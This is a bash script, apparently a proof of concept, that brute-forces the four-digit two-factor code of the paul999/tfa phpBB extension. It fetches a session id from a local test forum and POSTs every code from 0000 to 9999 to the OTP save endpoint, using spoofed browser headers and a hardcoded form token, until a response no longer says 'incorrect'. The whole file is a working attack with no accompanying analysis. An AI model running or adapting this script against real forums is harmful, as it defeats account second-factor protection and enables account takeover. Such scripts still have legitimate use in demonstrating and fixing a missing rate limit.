#!/bin/bash

d=$(date +"%s" | bc)
target=localhost:2223
sid=$(curl $target 2>/dev/null | grep delete_cookies | sed -r 's/.*sid=([^"]*)".*/\1/g')

for i in $(seq 0 9999); do
	totp=$(printf "%04d" "$i")
	resp=$(curl "http://$target/app.php/paul999/tfa/save/59/0/0/1/otp/?sid=$sid" --compressed -X POST -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.7' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H "Referer: http://$target/ucp.php?mode=login&sid=$sid" -H 'Content-Type: application/x-www-form-urlencoded' -H "Origin: http://$target" -H 'DNT: 1' -H 'Sec-GPC: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' -H 'Priority: u=0, i' --data-raw 'creation_time='"$d"'&form_token=292e5edd2b5e3d2bd7ec6ee9b23f1b3013e0d190&sid='"$sid"'&random=7c8330dd5a0038d866540aa7bb8eacee1d0aa893&redirect=index.php&authenticate='"$totp" 2>/dev/null)
	echo "$resp" | grep 'incorrect' >/dev/null
	if [ $? -eq 1 ]; then
		echo "totp found: $i"
		exit
	fi
	if (( i % 100 == 0 )); then
		echo "at $i..."
	fi
done

echo "totp not found :("
